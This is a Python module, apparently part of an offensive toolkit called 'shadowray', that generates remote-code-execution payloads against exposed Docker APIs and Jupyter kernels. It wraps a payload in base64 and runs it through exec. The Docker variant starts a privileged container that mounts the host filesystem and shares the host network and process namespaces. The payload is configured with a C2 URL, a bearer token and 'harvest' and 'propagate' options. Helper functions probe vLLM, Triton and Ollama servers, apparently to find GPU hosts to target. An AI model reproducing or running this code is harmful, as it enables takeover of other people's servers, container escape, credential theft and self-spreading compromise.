#!/usr/bin/env python3
"""
Host execution bootstrap — shell one-liners for Docker/Jupyter RCE.
Used by Docker RCE (/containers/create Entrypoint) and Jupyter kernel execution.
"""
import base64
import json
import logging
import urllib.request
from typing import Dict, Any, Optional

from .config import load_config
from .payload_src import build_payload

log = logging.getLogger("shadowray.hostexec")


def build_payload_src(c2_url: str = None, bearer: str = None, tag: str = "venom",
                      harvest: bool = True, propagate: bool = True, max_cycles: int = 1000) -> str:
    """Build the full payload source code."""
    cfg = load_config()
    return build_payload(
        c2_url or cfg["c2_url"],
        bearer or cfg["c2_bearer"],
        tag=tag,
        harvest=harvest,
        propagate=propagate,
        max_cycles=max_cycles,
    )


def bootstrap_cmd(payload_src: str) -> str:
    """Shell one-liner: python -c \"import base64;exec(base64.b64decode('...').decode())\" """
    b64 = base64.b64encode(payload_src.encode()).decode()
    # Escape for shell
    escaped = b64.replace('"', '\\"').replace("'", "\\'")
    return f'python -c "import base64;exec(base64.b64decode(\'{escaped}\').decode())"'


def bootstrap_py(payload_src: str) -> str:
    """Python expression: import base64;exec(base64.b64decode('...').decode())"""
    b64 = base64.b64encode(payload_src.encode()).decode()
    return f"import base64;exec(base64.b64decode('{b64}').decode())"


def docker_rce_payload(payload_src: str, image: str = "alpine") -> Dict[str, Any]:
    """Generate Docker container create payload for RCE via /containers/create."""
    cmd = bootstrap_cmd(payload_src)
    return {
        "Image": image,
        "Cmd": ["sh", "-c", cmd],
        "AttachStdout": True,
        "AttachStderr": True,
        "Tty": False,
        "OpenStdin": False,
        "HostConfig": {
            "NetworkMode": "host",
            "Privileged": True,
            "PidMode": "host",
            "IpcMode": "host",
            "Binds": ["/:/host"],
        }
    }


def jupyter_kernel_payload(payload_src: str) -> Dict[str, Any]:
    """Generate Jupyter kernel execution request."""
    code = bootstrap_py(payload_src)
    return {
        "code": code,
        "silent": False,
        "store_history": True,
        "user_expressions": {},
        "allow_stdin": False,
        "stop_on_error": True,
    }


def ollama_pull_payload(model: str = "llama3:8b") -> Dict[str, Any]:
    """Generate Ollama model pull request (for GPU host detection)."""
    return {
        "name": model,
        "stream": False
    }


def vllm_health_check(url: str) -> bool:
    """Check if vLLM server is healthy at /health endpoint."""
    try:
        req = urllib.request.Request(f"{url}/health")
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status == 200
    except Exception:
        return False


def triton_health_check(url: str) -> bool:
    """Check if Triton Inference Server is healthy."""
    try:
        req = urllib.request.Request(f"{url}/v2/health/ready")
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status == 200
    except Exception:
        return False


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO)
    
    # Build and print bootstrap command
    payload = build_payload_src()
    print("=== Shell one-liner ===")
    print(bootstrap_cmd(payload))
    print()
    print("=== Python expression ===")
    print(bootstrap_py(payload))
    print()
    print("=== Docker RCE payload ===")
    print(json.dumps(docker_rce_payload(payload), indent=2))
    print()
    print("=== Jupyter kernel payload ===")
    print(json.dumps(jupyter_kernel_payload(payload), indent=2))
